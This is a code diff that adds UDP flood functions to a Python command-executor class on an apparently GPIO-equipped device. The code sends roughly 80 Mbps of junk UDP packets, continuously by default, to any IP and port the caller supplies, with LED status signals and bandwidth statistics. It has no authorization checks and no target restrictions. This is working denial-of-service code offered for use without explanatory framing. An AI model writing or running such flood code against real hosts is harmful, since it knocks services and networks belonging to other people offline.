@@ -564,3 +564,155 @@ class CommandExecutor:
         except Exception as e:
             self.gpio.strobe_error()
             return {"ok": False, "error": f"EICAR packet send failed: {str(e)}"}
+    
+    def start_udp_flood(self, flood_data):
+        """Start UDP flood attack targeting ~80Mbps bandwidth"""
+        try:
+            target_ip = flood_data.get('target_ip', '').strip()
+            target_port = int(flood_data.get('target_port', 53))  # Default to DNS port
+            packet_size = int(flood_data.get('packet_size', 1024))  # Default 1KB packets
+            duration = flood_data.get('duration', 0)  # 0 = continuous
+            
+            if not target_ip:
+                return {"ok": False, "error": "Target IP is required"}
+            
+            # Calculate packets per second for ~80Mbps
+            # 80Mbps = 80 * 1024 * 1024 bits/sec = 83,886,080 bits/sec
+            # Convert to bytes/sec = 10,485,760 bytes/sec
+            target_bandwidth = 10485760  # bytes per second for 80Mbps
+            packets_per_second = target_bandwidth // packet_size
+            delay_between_packets = 1.0 / packets_per_second if packets_per_second > 0 else 0.001
+            
+            self.gpio.stop_anim()
+            self.gpio._off_all()
+            
+            # Create payload of specified size
+            payload = b'A' * packet_size
+            
+            # LED animation for flood start
+            self.gpio._set(PIN_R, R_ACTIVE_LOW, True)  # Red LED for attack
+            
+            # Store flood state
+            self.flood_active = True
+            self.flood_stats = {
+                'packets_sent': 0,
+                'bytes_sent': 0,
+                'start_time': time.time(),
+                'target_ip': target_ip,
+                'target_port': target_port
+            }
+            
+            def flood_worker():
+                """Worker function to send UDP packets"""
+                try:
+                    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+                    sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
+                    
+                    start_time = time.time()
+                    
+                    while self.flood_active:
+                        if duration > 0 and (time.time() - start_time) >= duration:
+                            break
+                            
+                        try:
+                            sock.sendto(payload, (target_ip, target_port))
+                            self.flood_stats['packets_sent'] += 1
+                            self.flood_stats['bytes_sent'] += len(payload)
+                            
+                            # Small delay to control bandwidth
+                            if delay_between_packets > 0:
+                                time.sleep(delay_between_packets)
+                                
+                        except Exception as e:
+                            print(f"Flood packet error: {e}")
+                            continue
+                    
+                    sock.close()
+                    
+                    # Stop animation when flood ends
+                    self.gpio._set(PIN_R, R_ACTIVE_LOW, False)
+                    # Flash completion pattern
+                    for _ in range(3):
+                        self.gpio._set(PIN_Y, Y_ACTIVE_LOW, True)
+                        time.sleep(0.2)
+                        self.gpio._set(PIN_Y, Y_ACTIVE_LOW, False)
+                        time.sleep(0.2)
+                        
+                except Exception as e:
+                    print(f"Flood worker error: {e}")
+                    self.flood_active = False
+                    self.gpio.strobe_error()
+            
+            # Start flood in background thread
+            self.flood_thread = threading.Thread(target=flood_worker, daemon=True)
+            self.flood_thread.start()
+            
+            return {
+                "ok": True,
+                "message": f"UDP flood started against {target_ip}:{target_port}",
+                "target_bandwidth_mbps": 80,
+                "packet_size": packet_size,
+                "packets_per_second": packets_per_second,
+                "duration": duration if duration > 0 else "continuous"
+            }
+            
+        except Exception as e:
+            self.gpio.strobe_error()
+            return {"ok": False, "error": f"UDP flood start failed: {str(e)}"}
+    
+    def stop_udp_flood(self):
+        """Stop the UDP flood attack"""
+        try:
+            if hasattr(self, 'flood_active'):
+                self.flood_active = False
+                
+            # Calculate final stats
+            if hasattr(self, 'flood_stats'):
+                duration = time.time() - self.flood_stats['start_time']
+                avg_bandwidth = (self.flood_stats['bytes_sent'] * 8) / duration / 1024 / 1024  # Mbps
+                
+                stats = {
+                    "ok": True,
+                    "message": "UDP flood stopped",
+                    "packets_sent": self.flood_stats['packets_sent'],
+                    "bytes_sent": self.flood_stats['bytes_sent'],
+                    "duration_seconds": round(duration, 2),
+                    "average_bandwidth_mbps": round(avg_bandwidth, 2)
+                }
+            else:
+                stats = {"ok": True, "message": "No active flood to stop"}
+            
+            # Stop LED animation
+            self.gpio._set(PIN_R, R_ACTIVE_LOW, False)
+            self.gpio._off_all()
+            
+            return stats
+            
+        except Exception as e:
+            return {"ok": False, "error": f"UDP flood stop failed: {str(e)}"}
+    
+    def get_flood_status(self):
+        """Get current flood attack status"""
+        try:
+            if not hasattr(self, 'flood_active') or not self.flood_active:
+                return {"ok": True, "active": False, "message": "No active flood"}
+            
+            if hasattr(self, 'flood_stats'):
+                duration = time.time() - self.flood_stats['start_time']
+                current_bandwidth = (self.flood_stats['bytes_sent'] * 8) / duration / 1024 / 1024 if duration > 0 else 0
+                
+                return {
+                    "ok": True,
+                    "active": True,
+                    "packets_sent": self.flood_stats['packets_sent'],
+                    "bytes_sent": self.flood_stats['bytes_sent'],
+                    "duration_seconds": round(duration, 2),
+                    "current_bandwidth_mbps": round(current_bandwidth, 2),
+                    "target_ip": self.flood_stats['target_ip'],
+                    "target_port": self.flood_stats['target_port']
+                }
+            else:
+                return {"ok": True, "active": True, "message": "Flood active but no stats available"}
+                
+        except Exception as e:
+            return {"ok": False, "error": f"Flood status check failed: {str(e)}"}
